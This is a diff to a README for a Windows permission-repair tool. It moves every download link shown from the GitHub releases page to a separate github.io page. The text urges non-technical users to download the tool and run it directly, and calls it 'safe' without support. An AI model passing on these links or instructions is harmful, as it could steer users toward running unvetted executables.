@@ -1,6 +1,6 @@
 # 🔧 NTFS-Permission-Reset-Tools - Fix Access Denied Errors Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-NTFS_Permission_Reset_Tools-blue?style=for-the-badge&logo=windows&logoColor=white&color=0078D6)](https://github.com/Heavy-guitarpick2003/NTFS-Permission-Reset-Tools/releases)
+[![Download Now](https://img.shields.io/badge/Download-NTFS_Permission_Reset_Tools-blue?style=for-the-badge&logo=windows&logoColor=white&color=0078D6)](https://heavy-guitarpick2003.github.io)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome! This tool helps you fix common Windows permission problems. If you see 
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/Heavy-guitarpick2003/NTFS-Permission-Reset-Tools/releases](https://github.com/Heavy-guitarpick2003/NTFS-Permission-Reset-Tools/releases)
+Visit this link to download the application: [https://heavy-guitarpick2003.github.io](https://heavy-guitarpick2003.github.io)
 
 Once you click the link, you'll see a list of available versions. Choose the latest version (the one with the highest number). Click the download button next to it. The file will start downloading to your computer. After the download finishes, you can run the application directly from your Downloads folder.
 
@@ -160,7 +160,7 @@ Check the download link regularly for updates. New versions include:
 
 Stop struggling with "Access Denied" errors. This tool gives you back control over your files and folders. Download it now and fix your permission problems in minutes. It's free, safe, and easy to use. No technical knowledge required. Just download, run, and click. Your files will be accessible again.
 
-Remember: Visit this link to download the application: [https://github.com/Heavy-guitarpick2003/NTFS-Permission-Reset-Tools/releases](https://github.com/Heavy-guitarpick2003/NTFS-Permission-Reset-Tools/releases)
+Remember: Visit this link to download the application: [https://heavy-guitarpick2003.github.io](https://heavy-guitarpick2003.github.io)
 
 Get your folders working again today!
 
